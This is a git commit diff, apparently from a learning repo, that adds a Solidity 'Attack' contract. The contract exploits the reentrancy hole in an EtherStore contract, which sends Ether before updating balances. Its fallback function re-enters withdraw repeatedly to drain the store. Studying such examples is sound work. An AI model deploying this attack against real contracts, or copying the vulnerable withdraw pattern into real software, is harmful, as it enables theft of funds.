15427d4da028028162a2a4e1b5997e9d4824a7bc
Saksham Tewari <sakshamtewari3@gmail.com>
2024-07-11 02:00:51 +0530

    Added Attack contract

--- Hacking/Reentrancy.sol
+++ Hacking/Reentrancy.sol
@@ -1,3 +1,4 @@
+//SPDX-License-Identifier: Unlicensed"
 pragma solidity ^0.8.0;
 
 contract EtherStore {
@@ -8,12 +9,35 @@ contract EtherStore {
     }
 
     function withdraw(uint _amount) public {
-        require(balances[msg.sender] >= _amount);
+        require(balances[msg.sender] >= _amount, "Insufficient balance");
 
         (bool sent, ) = msg.sender.call{value: _amount}("");
         require(sent, "Failed to send Ether");
 
         balances[msg.sender] -= _amount;
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    EtherStore public etherStore;
+
+    constructor(address _etherStoreAddres) {
+        etherStore = EtherStore(_etherStoreAddres);
+    }
+
+    fallback() external payable {
+        if (address(etherStore).balance >= 1 ether)
+            etherStore.withdraw(1 ether);
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw(1 ether);
     }
 
     function getBalance() public view returns (uint) {
